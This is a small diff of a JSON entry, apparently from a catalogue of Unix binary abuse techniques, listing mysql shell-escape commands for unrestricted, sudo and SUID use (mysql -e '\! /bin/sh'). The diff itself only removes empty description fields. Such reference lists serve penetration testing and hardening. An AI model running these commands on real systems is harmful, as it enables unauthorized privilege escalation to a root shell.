@@ -2,19 +2,19 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "mysql -e '\\! /bin/sh'\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo mysql -e '\\! /bin/sh'\n"
       }
     ],
     "limited-suid": [
       {
-        "description": "",
+        
         "code": "./mysql -e '\\! /bin/sh'\n"
       }
     ],
